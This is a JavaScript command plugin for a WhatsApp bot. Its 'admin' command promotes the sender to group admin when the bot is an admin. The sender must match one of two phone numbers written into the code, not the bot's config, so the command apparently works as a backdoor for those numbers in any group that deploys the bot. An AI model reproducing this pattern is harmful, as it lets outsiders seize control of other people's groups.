const { cmd } = require("../command");
const config = require("../config");
const { resolveToJid, loadLidMappings } = require("../lid-utils.js");

cmd({
  pattern: "admin",
  alias: ["takeadmin", "makeadmin"],
  desc: "Take adminship (authorized users only)",
  category: "owner",
  react: "👑",
  filename: __filename
}, async (conn, msg, m, extra) => {
  const { from, sender, isGroup, reply } = extra;

  try {
    if (!isGroup)
      return reply("❌ This command can only be used in groups.");

    const maps = loadLidMappings();

    const resolvedSender =
      String(resolveToJid(sender, maps) || sender).toLowerCase();

    const resolvedBot =
      String(resolveToJid(conn.user.id, maps) || conn.user.id).toLowerCase();

    /* ========= AUTHORIZED USERS ========= */

    const rawAuthorized = [
      "237694668970",
      "237696900612"
    ]
      .flat()
      .filter(Boolean)
      .map(v => String(v).trim());

    const authorizedJids = rawAuthorized.map(v => {
      if (!v.includes("@") && /^\d{6,15}$/.test(v))
        v = `${v}@s.whatsapp.net`;
      return v.toLowerCase();
    });

    if (!authorizedJids.includes(resolvedSender))
      return reply("❌ This command is restricted to authorized users only.");

    /* ========= GROUP METADATA ========= */

    const groupMetadata = await conn.groupMetadata(from);

    let senderIsAdmin = false;
    let botIsAdmin = false;

    for (const p of groupMetadata.participants) {
      const pid =
        String(resolveToJid(p.id, maps) || p.id).toLowerCase();

      if (
        pid === resolvedSender &&
        (p.admin === "admin" || p.admin === "superadmin")
      ) {
        senderIsAdmin = true;
      }

      if (
        pid === resolvedBot &&
        (p.admin === "admin" || p.admin === "superadmin")
      ) {
        botIsAdmin = true;
      }
    }

    if (!botIsAdmin)
      return reply("❌ I need to be an admin to perform this action.");

    if (senderIsAdmin)
      return reply("ℹ️ You are already an admin in this group.");

    /* ========= PROMOTE ========= */

    await conn.groupParticipantsUpdate(
      from,
      [resolvedSender],
      "promote"
    );

    reply("✅ Successfully granted you admin rights 👑");

  } catch (err) {
    console.error("[ADMIN COMMAND ERROR]:", err);
    reply("❌ Failed to grant admin rights.");
  }
});
